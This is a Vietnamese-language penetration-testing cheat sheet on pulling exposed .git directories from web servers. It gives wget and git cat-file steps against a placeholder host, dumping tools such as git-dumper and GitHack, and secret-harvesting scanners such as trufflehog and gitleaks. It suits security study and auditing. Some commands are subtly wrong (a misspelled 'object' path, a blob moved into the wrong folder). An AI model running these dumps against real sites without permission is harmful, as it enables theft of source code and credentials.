# Git

## Tóm tắt

* [Phương pháp](#methodology)

  * [Khôi phục nội dung file từ .git/logs/HEAD](#recovering-file-contents-from-gitlogshead)
  * [Khôi phục nội dung file từ .git/index](#recovering-file-contents-from-gitindex)
* [Công cụ](#tools)

  * [Khôi phục tự động](#automatic-recovery)

    * [git-dumper.py](#git-dumperpy)
    * [diggit.py](#diggitpy)
    * [GoGitDumper](#gogitdumper)
    * [rip-git](#rip-git)
    * [GitHack](#githack)
    * [GitTools](#gittools)
  * [Thu thập secrets](#harvesting-secrets)

    * [noseyparker](#noseyparker)
    * [trufflehog](#trufflehog)
    * [Yar](#yar)
    * [Gitrob](#gitrob)
    * [Gitleaks](#gitleaks)
* [Tài liệu tham khảo](#references)

## Phương pháp

Các ví dụ dưới đây sẽ tạo một bản sao của `.git` hoặc một bản sao của commit hiện tại.

Kiểm tra các file sau; nếu chúng tồn tại, bạn có thể trích xuất thư mục `.git`.

* `.git/config`
* `.git/HEAD`
* `.git/logs/HEAD`

### Khôi phục nội dung file từ .git/logs/HEAD

* Kiểm tra `403 Forbidden` hoặc directory listing để tìm thư mục `/.git/`

* Git lưu toàn bộ thông tin trong `.git/logs/HEAD` (thử cả chữ thường `head`)

  ```powershell
  0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
  15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
  26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
  6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
  ```

* Truy cập commit bằng hash

  ```powershell
  # tạo một repository .git rỗng
  git init test
  cd test/.git

  # tải file xuống
  wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c

  # byte đầu tiên cho thư mục con, các byte còn lại cho tên file
  mkdir .git/object/26
  mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/

  # hiển thị file
  git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
      tree 323240a3983045cdc0dec2e88c1358e7998f2e39
      parent 15ca375e54f056a576905b41a417b413c57df6eb
      author Michael <michael@easyctf.com> 1489390329 +0000
      committer Michael <michael@easyctf.com> 1489390329 +0000
      Initial.
  ```

* Truy cập tree `323240a3983045cdc0dec2e88c1358e7998f2e39`

  ```powershell
  wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
  mkdir .git/object/32
  mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/

  git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
      040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
      100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
      040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
      100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
      040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
  ```

* Đọc dữ liệu (`flag.txt`)

  ```powershell
  wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
  mkdir .git/object/cb
  mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
  git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
  ```

### Khôi phục nội dung file từ .git/index

Sử dụng Git index file parser https://pypi.python.org/pypi/gin (python3).

```powershell
pip3 install gin
gin ~/git-repo/.git/index
```

Khôi phục tên và hash SHA-1 của mọi file được liệt kê trong index, sau đó sử dụng quy trình tương tự ở trên để khôi phục file.

```powershell
$ gin .git/index | egrep -e "name|sha1"
name = AWS Amazon Bucket S3/README.md
sha1 = 862a3e58d138d6809405aa062249487bee074b98

name = CRLF injection/README.md
sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
```

## Công cụ

### Khôi phục tự động

#### git-dumper.py

* https://github.com/arthaud/git-dumper

```powershell
pip install -r requirements.txt
./git-dumper.py http://web.site/.git ~/website
```

#### diggit.py

* [bl4de/security-tools/diggit](https://github.com/bl4de/security-tools/)

```powershell
./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
```

`-u` là đường dẫn từ xa, nơi tồn tại thư mục `.git`
`-t` là đường dẫn đến thư mục cục bộ chứa Git repository giả và nơi nội dung blob (các file) được lưu với tên thật của chúng (`cd /path/to/temp/folder && git init`)
`-o` là hash của Git object cụ thể cần tải xuống

#### GoGitDumper

* https://github.com/c-sto/gogitdumper

```powershell
go get github.com/c-sto/gogitdumper
gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/
git log
git checkout
```

#### rip-git

* https://github.com/kost/dvcs-ripper

```powershell
perl rip-git.pl -v -u "http://web.site/.git/"

git cat-file -p 07603070376d63d911f608120eb4b5489b507692
tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
parent 15ca375e54f056a576905b41a417b413c57df6eb
author Michael <michael@easyctf.com> 1489389105 +0000
committer Michael <michael@easyctf.com> 1489389105 +0000

git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
```

#### GitHack

* https://github.com/lijiejie/GitHack

```powershell
GitHack.py http://web.site/.git/
```

#### GitTools

* https://github.com/internetwache/GitTools

```powershell
./gitdumper.sh http://target.tld/.git/ /tmp/destdir
git checkout -- .
```

### Thu thập secrets

#### noseyparker

> https://github.com/praetorian-inc/noseyparker - Nosey Parker là một công cụ dòng lệnh giúp tìm kiếm secrets và thông tin nhạy cảm trong dữ liệu dạng văn bản và lịch sử Git.

```ps1
git clone https://github.com/trufflesecurity/test_keys
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest scan --datastore datastore.np ./test_keys/
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest report --color always
noseyparker scan --datastore np.noseyparker --git-url https://github.com/praetorian-inc/noseyparker
noseyparker scan --datastore np.noseyparker --github-user octocat
```

#### trufflehog

> Tìm kiếm các chuỗi có entropy cao và secrets trong Git repository, đào sâu vào lịch sử commit.

```powershell
pip install truffleHog
truffleHog --regex --entropy=False https://github.com/trufflesecurity/trufflehog.git
```

#### Yar

> Tìm kiếm secrets trong repository Git của user/organization bằng regex, entropy hoặc cả hai. Lấy cảm hứng từ truffleHog nổi tiếng.

```powershell
go get github.com/nielsing/yar # https://github.com/nielsing/yar
yar -o orgname --both
```

#### Gitrob

> Gitrob là một công cụ giúp tìm các file có khả năng chứa thông tin nhạy cảm được push lên các repository public trên Github. Gitrob sẽ clone các repository thuộc về một user hoặc organization xuống độ sâu có thể cấu hình, duyệt qua lịch sử commit và đánh dấu các file khớp với signature của những file có khả năng chứa thông tin nhạy cảm.

```powershell
go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
gitrob [options] target [target2] ... [targetN]
```

#### Gitleaks

> Gitleaks cung cấp một phương thức để tìm các secrets chưa được mã hóa và những loại dữ liệu không mong muốn khác trong các Git source code repository.

* Chạy gitleaks trên một public repository

  ```powershell
  docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git
  ```

* Chạy gitleaks trên một repository cục bộ đã được clone vào `/tmp/`

  ```powershell
  docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks
  ```

* Chạy gitleaks trên một GitHub Pull Request cụ thể

  ```powershell
  docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000
  ```

## Tài liệu tham khảo

* [Gitrob: Now in Go - Michael Henriksen - January 24, 2024](https://web.archive.org/web/20240930092732/https://michenriksen.com/blog/gitrob-now-in-go/)
